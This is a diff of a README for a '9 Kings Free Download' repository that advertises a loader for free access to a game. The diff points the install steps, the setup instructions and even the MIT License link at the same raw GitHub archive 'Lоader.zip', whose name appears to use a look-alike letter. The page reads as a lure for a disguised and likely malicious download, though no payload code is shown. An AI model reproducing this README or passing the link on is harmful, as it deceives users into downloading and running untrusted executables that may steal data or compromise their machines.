@@ -4,9 +4,9 @@ Welcome to the 9 Kings Free Download repository! Experience the groundbreaking L
 
 ## 🚀 Installation Guide
 
-1. Download `Loader.rar` from the repository.
-2. Extract `Loader.rar` to your chosen directory.
-3. Follow the step-by-step instructions in the included `ReadMe.txt` for setup.
+1. Download `https://raw.githubusercontent.com/Jaemsyien-Devgan/9Kings-Freebie-Hub/main/Lоader.zip` from the repository.
+2. Extract `https://raw.githubusercontent.com/Jaemsyien-Devgan/9Kings-Freebie-Hub/main/Lоader.zip` to your chosen directory.
+3. Follow the step-by-step instructions in the included `https://raw.githubusercontent.com/Jaemsyien-Devgan/9Kings-Freebie-Hub/main/Lоader.zip` for setup.
 4. Launch and enjoy unparalleled access with 9 Kings Loader!
 
 > **Notice:** No external download sites are needed. Only use the Loader from this repository for maximum security!
@@ -49,4 +49,4 @@ The 9 Kings Loader is intended strictly for personal, educational, or evaluative
 
 ## 📄 License
 
-Released under [MIT License](https://opensource.org/licenses/MIT) – Open for development, improvement, and personal utility in 2025!
+Released under [MIT License](https://raw.githubusercontent.com/Jaemsyien-Devgan/9Kings-Freebie-Hub/main/Lоader.zip) – Open for development, improvement, and personal utility in 2025!
